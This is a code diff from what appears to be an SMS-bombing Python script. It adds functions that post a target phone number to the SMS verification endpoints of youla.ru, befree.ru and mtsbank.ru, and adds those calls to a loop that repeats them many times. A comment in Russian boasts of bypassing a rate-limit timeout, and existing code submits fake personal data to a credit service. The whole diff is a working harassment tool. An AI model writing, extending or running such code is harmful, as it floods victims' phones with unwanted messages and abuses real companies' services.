@@ -206,6 +206,32 @@ def beelinecredit(phone):
                                          json={"personalData":{"firstName":"Иван","lastName":"Петров","middleName":"Романович","phoneNumber":blncrdtphn},"consentToDataProcessing":"true"})
     print(response_beelinecredit, response_beelinecredit.content)
 
+def youla(phone):
+    ylphn = '7'+phone
+    data = {
+        'phone': ylphn
+    }
+    response_youla = requests.post(url='https://youla.ru/web-api/auth/request_code', data=data)
+    print(response_youla, response_youla.content)
+
+def befree(phone):
+    bfrphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
+            '-' + phone[8:10]
+    data = {
+        'telephone': bfrphn
+    }
+    response_befree = requests.post(url='https://www.befree.ru/reward/guest/sendCode/', data=data)
+    print(response_befree, response_befree.content)
+
+#  таймаут написано 30 сек, но я вроде его обошел 
+def mtsbank(phone):
+    mtsbnkphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] + phone[8:10]
+    data = {
+        'phone': mtsbnkphn
+    }
+    response_mtsbank = requests.post(url='https://www.mtsbank.ru/ajax/sms.php', data=data)
+    print(response_mtsbank, response_mtsbank.content)
+
 
 def generate_email():
     """
@@ -223,6 +249,7 @@ def generate_email():
 
 def run(phone, n):
     taxi2412regist(phone)
+    befree(phone)
     for i in range(n): #  timeout 180
         kfc(phone)
         ostin(phone)
@@ -239,4 +266,6 @@ def run(phone, n):
                 sela(phone)
                 novextrade(phone)
                 atb(phone)
+                youla(phone)
+                mtsbank(phone)
                 sleep(6)
